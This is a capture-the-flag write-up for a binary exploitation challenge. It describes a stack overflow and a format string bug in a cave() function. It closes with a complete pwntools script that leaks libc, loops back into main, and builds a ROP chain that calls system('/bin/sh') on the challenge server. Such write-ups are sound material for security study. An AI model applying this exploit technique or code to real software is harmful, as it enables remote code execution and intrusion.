# Aladdin ka Chirag Writeup

## Description
what's your wish?

## Static Analysis
- checksec: The binary has no canary
```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

- Reverse engineering: The program logic is quite simple, as it has a single ```cave()``` function that allows us to read into two buffers on the stack: ```buf``` and ```s```

- Vulnerabilities: The function ```cave()``` has two vulnerabilities:

    1. Stack overflow: It allocates 8 bytes for ```s```, but allows us to write upto 18 bytes to it. Hence, it is possible to overwrite saved rbp and 2 lowest bytes of the return address
    2. Format string bug: It calls ```printf(buf)``` with buf being a user controlled buffer

## Exploitation
- The first thing to mention is that if we can execute ```cave()``` only once, it is impossible to get a working exploit as despite the two bugs, we do not have any leak at first. Therefore, it is important to use the stack overflow vulnerability to create a loop, in which we can execute the ```cave()``` function many times. The approach that I opt for is overwriting the lowest byte of the return address from D2 to B0, which allows us to jump to the beginning of ```main()```.

- From now, there are different paths that we can follow, as we have a powerful format string vulnerability (note that the payload string can be upto 24 bytes). However, I accidentally found a seemingly easier ROP approach, because I see some of my addresses "stacked" up as return addresses consecutively.

- My approach is generally as follows: First, I leak libc using the format string bug. After every ```cave()``` calls, we need to always overwrite the last byte of the return address to B0 to loop back to main. The next thing that I notice is in the beginning of main, there are 2 instructions
```asm
push    rbp
mov     rbp, rsp
```

- Since the saved rbp is under our control, then we can push it back on the stack at the beginning of main. Another good thing is that we do not need to worry about it being a legitimate stack address as it will always be overwritten with rsp afterwards.
- Finally, we simply put our ROP gadgets at the positions of saved rbp to achieve a chain

```python
#!/usr/bin/env python3

from pwn import *
libc = ELF('./libc.so.6')
p = remote('remote.infoseciitr.in', 8007)

def leak_libc():
    p.sendafter(b'name >>', b'A' * 16 + b'\xb0')
    p.sendafter(b'wish >> ', b'%11$llx\0')
    libc_leak = p.recvline().strip().decode()
    return int('0x' + libc_leak, 16) - 0x2a1ca

# Leak libc
libc_base = leak_libc()
log.info(f'libc_base: {hex(libc_base)}')

# Calculating addresses
pop_rdi = libc_base + 0x10f78b
pop_rsi = libc_base + 0x110a7d
binsh = libc_base + next(libc.search(b'/bin/sh'))
system = libc_base + libc.symbols['system']

# ROP
p.sendafter(b'name >>', b'A' * 8 + p64(system) + b'\xb0')
p.sendafter(b'wish >> ', b'A' * 8)
p.sendafter(b'name >>', b'A' * 8 + p64(0) + b'\xb0')
p.sendafter(b'wish >> ', b'A' * 8)
p.sendafter(b'name >>', b'A' * 8 + p64(pop_rsi) + b'\xb0')
p.sendafter(b'wish >> ', b'A' * 8)
p.sendafter(b'name >>', b'A' * 8 + p64(binsh) + b'\xb0')
p.sendafter(b'wish >> ', b'A' * 8)
p.sendafter(b'name >>', b'A' * 8 + p64(pop_rdi) + b'\xb0')
p.sendafter(b'wish >> ', b'A' * 8)

# Padding so that when we end the loop, ROP will start at pop_rdi
p.sendafter(b'name >>', b'A' * 8 + b'A' * 8 + b'\xb0')
p.sendafter(b'wish >> ', b'A' * 8)

# Send this to end the loop
p.sendafter(b'name >> ', b'A')
p.sendafter(b'wish >> ', b'A')

p.interactive()
```